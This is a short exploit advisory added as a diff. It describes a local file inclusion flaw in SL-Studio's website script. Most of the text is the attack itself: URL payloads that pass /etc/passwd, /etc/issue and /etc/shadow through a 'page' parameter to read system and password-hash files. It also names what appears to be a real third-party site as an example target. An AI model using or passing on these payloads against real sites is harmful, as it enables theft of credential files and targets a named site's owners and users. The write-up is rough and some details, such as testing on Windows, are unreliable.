@@ -1,0 +1,11 @@
+Not Published
+# Exploit Title:  SL-Studio script - LFI
+# Vendor Homepage: https://www.slstudio.se
+# Tested on: windows 7/google
+slstudio design websites for you which is vulnerable to lfi 
+and can be exploit to read the system hashs passwords
+use https://www.exemple.com/index.php?page=/etc/passwd
+                                           /etc/issue
+                                           /etc/shadow 
+Example:
+https://www.ravagedband.com/index.php?page=/etc/shadow
